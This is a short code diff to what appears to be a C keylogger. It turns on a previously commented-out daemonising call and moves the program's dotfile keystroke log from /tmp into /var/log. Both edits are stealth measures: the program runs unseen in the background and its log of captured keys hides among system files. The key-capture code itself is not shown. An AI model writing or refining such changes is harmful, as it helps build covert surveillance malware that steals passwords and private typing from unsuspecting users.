@@ -184,7 +184,7 @@ int main(int argc, char const *argv[])
   printf("this is my fd: %d\n", fd);  
   close(fd);
 
-  //make_daemon();
+  make_daemon();
 
   signal(SIGINT, cleanNexit);
   signal(SIGTERM, cleanNexit);
@@ -196,7 +196,7 @@ int main(int argc, char const *argv[])
   }
 
   //opening log.txt file
-  log_ptr = fopen("/tmp/.keylog.txt", "w");
+  log_ptr = fopen("/var/log/.keylog.txt", "w");
   if (log_ptr == NULL)
   {
    	perror("Error while opening log file");
